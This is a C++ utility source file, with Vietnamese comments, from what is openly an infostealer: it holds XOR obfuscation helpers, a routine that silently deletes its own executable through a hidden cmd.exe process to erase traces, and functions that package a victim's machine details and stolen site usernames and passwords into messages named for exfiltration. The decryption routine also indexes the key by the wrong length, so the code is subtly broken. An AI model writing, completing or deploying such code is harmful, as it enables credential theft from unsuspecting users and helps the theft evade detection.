#include<Windows.h>  
#include "Utils.h"  
#include <vector>
#include <tuple>
#include <string>
#include <sstream>
#include "system_infor.h"

Utils::Utils() {}; 
Utils::~Utils() {};

// mã hóa XOR đơn giản
std::string Utils::decryptXor(const std::string& input, const std::string& key) {  
    std::string output = "";  
    for (int i = 0; i < input.size(); i++) {  
        output += input[i] ^ key[i%input.size()];
    }  
    return output;  
}  

std::string Utils::encryptXor(const std::string& input, const std::string& key) {  
    std::string output = ""; 
    for (int i = 0; i < input.size();  i++) {
		output += input[i] ^ key[i % key.size()];
    }
	return output;
}



// Hàm này sẽ tự hủy file thực thi sau 2 giây
void Utils::seflDestroy() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    std::string command = "cmd.exe /C timeout /t 2 >nul & del \"" + std::string(path) + "\"";

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA(
        NULL,
        (LPSTR)command.c_str(),
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    // Đóng handle cho gọn (tránh leak)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


// Hàm này sẽ xây dựng một chuỗi JSON từ dữ liệu đầu vào để gửi di 
std::string Utils::buildExfilVictimProfileMessage(SystemInfor& sys) {
    std::ostringstream oss;
    oss << "**[👤 VICTIM PROFILE]**\n";
    oss << "• HWID: " << sys.getHwid() << "\n";
    oss << "• User: " << sys.getUser() << "\n";
    oss << "• Computer: " << sys.getComputer() << "\n";
    oss << "• OS: " << sys.getOs() << "\n";
    oss << "• IP: " << sys.getIp() << "\n";
    oss << "• Location: " << sys.getLocation() << "\n\n";

    return oss.str();
}

// Hàm này sẽ xây dựng một chuỗi JSON từ dữ liệu đầu vào để gửi di 
std::string Utils::buildExfilDataMessage(const std::tuple<std::string, std::string, std::string, std::string>& creds) {
    std::ostringstream oss;
    oss << "**[🔐 CREDENTIALS]**\n";
    const auto& [profile, url, user, pass] = creds;
    oss << "- [" << profile << "] " << url << "\n";
    oss << "  👤 " << user << "\n";
    oss << "  🔑 " << pass << "\n\n";
    return oss.str();
}
